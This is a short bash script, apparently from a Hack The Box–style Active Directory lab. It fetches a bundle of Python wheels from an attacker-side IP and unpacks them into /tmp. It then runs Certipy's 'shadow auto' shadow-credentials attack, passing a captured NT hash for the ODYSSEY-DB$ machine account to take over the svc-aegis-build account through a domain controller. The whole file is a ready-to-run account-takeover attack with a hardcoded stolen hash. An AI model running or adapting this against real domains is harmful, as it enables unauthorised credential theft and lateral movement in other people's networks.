#!/bin/bash
HASH="71bc6be8565f0c9871070c3912b1680d"
cd /tmp
if ! ls /tmp/adwheels/*.whl >/dev/null 2>&1; then
  curl -fsSL -o adwheels.tgz http://10.10.15.183:8090/adwheels.tgz
  mkdir -p adwheels && tar -xzf adwheels.tgz -C adwheels
fi
rm -rf /tmp/pylibs
mkdir -p /tmp/pylibs
for w in /tmp/adwheels/*.whl; do
  python3 -c "import zipfile,sys; zipfile.ZipFile(sys.argv[1]).extractall('/tmp/pylibs')" "$w" || true
done
export PYTHONPATH=/tmp/pylibs
python3 -c 'import certipy; print(certipy.__file__)'
# try common CLIs
python3 -c 'from certipy.entry import main' 2>&1 | head -3
python3 <<PY
import sys
sys.path.insert(0,"/tmp/pylibs")
# Certipy v5 uses certipy.commands or entry
try:
  from certipy.__main__ import main
except Exception:
  try:
    from certipy.entry import main
  except Exception as e:
    print("import fail", e)
    sys.exit(1)
sys.argv = ["certipy","shadow","auto","-u","ODYSSEY-DB\$@odyssey.htb","-hashes",":71bc6be8565f0c9871070c3912b1680d","-account","svc-aegis-build","-dc-ip","172.16.0.10"]
main()
PY
echo SHADOW4_END
